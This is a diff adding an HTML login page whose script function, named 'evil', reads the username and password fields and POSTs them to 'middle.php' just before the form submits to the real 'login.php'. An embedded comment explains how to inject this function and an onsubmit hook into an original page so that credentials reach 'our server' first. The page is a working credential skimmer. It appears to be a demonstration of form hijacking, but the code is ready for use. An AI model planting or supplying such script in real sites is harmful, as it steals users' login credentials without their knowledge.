@@ -1,0 +1,47 @@
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>Login page</title>
+		
+		<script>
+			function evil()
+			{
+				//Get username and password from textboxs
+				var data1 = document.getElementById("username").value;
+				var data2 = document.getElementById("password").value;
+				
+				//Create a data string
+				var params ="username="+data1 +"&password=" +data2;
+				
+				//Create a request
+				var httpc = new XMLHttpRequest();
+				var url = "middle.php";
+				httpc.open("POST", url, false);
+				
+				//Set a header
+				httpc.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+				httpc.setRequestHeader("Content-Length", params.length);
+				
+				//Send request
+				httpc.send(params);
+			}
+		</script>
+	</head>
+	<body>
+		<h1>Enter your secret data</h1>
+		
+		 <!--
+		 Into original page you need to insert function evil and into login form 
+		 insert onsubmit="evil();" to call function evil just before call the legit server.
+		 Our evil function will send secret data to our server before.
+		 -->
+		 
+		<form action="login.php" method="POST"  id="login_form" onsubmit="evil();">
+		
+            Username: <input name="username" id="username" type="text" size="25" /><br />
+            Password: <input name="password" id="password" type="password" size="25" /><br />
+            
+            <input name="submit" type="submit" value="Enter" />
+       </form>
+	</body>
+</html>
